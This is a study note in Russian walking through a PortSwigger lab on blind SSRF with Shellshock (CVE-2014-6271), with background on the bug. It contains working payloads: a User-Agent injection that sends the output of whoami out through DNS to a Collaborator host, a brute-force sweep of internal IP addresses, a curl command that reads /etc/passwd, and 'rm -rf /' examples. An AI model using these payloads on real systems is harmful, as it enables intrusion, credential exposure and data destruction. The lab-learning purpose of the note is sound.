https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation

CVE-2014-6271

эта лаба - покаказывает какая раньше была уязвимость в bash Shellshock
в новых версиях bash уже нет этой уявимости и если и приходит в пейлоаде функция то выполнение функции останавливается на закрывающей скобке }

**Все версии bash от 1.14 до 4.3** (древние мамонты) уязвимы

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

без колоборатора и платной версии burp решить нельзя

я планировал  использовать сервис 
https://app.interactsh.com

либо свою облачную функцию-детектор
  
https://functions.yandexcloud.net/d5esdrhe74dаdgvukpc1t

но портсвиггер запрещает сторонние домены кроме своего. 
поэтому :  БЕЗ ПОДПИСКИ ЭТУ ЛАБУ НЕВОЗМОЖНО РЕШИТЬ


------
посмотрю их решение и разбересь в нем!


**SSRF + уязвимость Shellshock** для выполнения команд на внутреннем сервере и **узнать имя пользователя ОС** через DNS-эксплуатацию


вот запрос, в заголовке referere есть ссылка!

<img src="../../assets/ssrf_0604.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />





пейлоады для REFERER
и для USER-AGENT


  Страница продукта делает **HTTP-запрос** с заголовком `Referer`
 
  В `Referer` подставляется **User-Agent пользователя** → уязвимость!

Уязвимость Shellshock (`CVE-2014-6271`) позволяет выполнять команды через переменные окружения.

() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN =пейлоад!

==whoami - команда, возвращающая имя пользователя ОС (попал ку-то спросил кто-я)

==nslookup - делает DNS-запрос с результатом в поддомене

<img src="../../assets/ssrf070607.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />





### **Атака через Intruder**

1. **User-Agent** заменяем на Shellshock payload
   
2. **Referer** меняем на `http://192.168.0.§1§:8080`
   
3. Брутфорсим последний октет IP (1-255)
   
4. Когда находим уязвимый сервер → команда на серваке выполняется

5.  на мой хост приходит запрос с данными (лаба выполнена)

<img src="../../assets/ssrf07077.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
логи

---------------
# Shellshock

**Shellshock** (`CVE-2014-6271`) — это **критическая уязвимость в bash** (командной оболочке Linux), которая позволяла выполнять **любые команды** через переменные окружения.
**Год обнаружения:** 2014  
**Уровень опасности:** 10/10 (критический)

-----

Можно было:

- Читать файлы (`/etc/passwd`)   =  Простейший эксплойт:

curl -H "User-Agent: () { :; }; echo; /bin/cat /etc/passwd" http://target/cgi-bin/test.cgi 

- Устанавливать бэкдоры
   
- Делать DDoS-атаки
   
- Добывать крипту (ботнеты)

------


### обычный запрос:

Переменная окружения: USER_AGENT="Chrome"
Bash читает: "Это просто текст, показываю как есть"

### **с уязвимостью Shellshock:**

Переменная окружения: USER_AGENT="() { :; }; rm -rf /"
Bash читает: "О, функция! Выполню её... и ВСЁ ПОСЛЕ ТОЖЕ!"

----
сам пейлоад:

() { :; }; /bin/bash -c "rm -rf /"
↑         ↑
Функция   Выполняется!
(пустая)  (опасная команда)

-----

эксплуатация:

Запрос:
GET / HTTP/1.1
User-Agent: () { :; }; /usr/bin/id

-----

**Все версии bash от 1.14 до 4.3** (выпущенные за ~25 лет!)



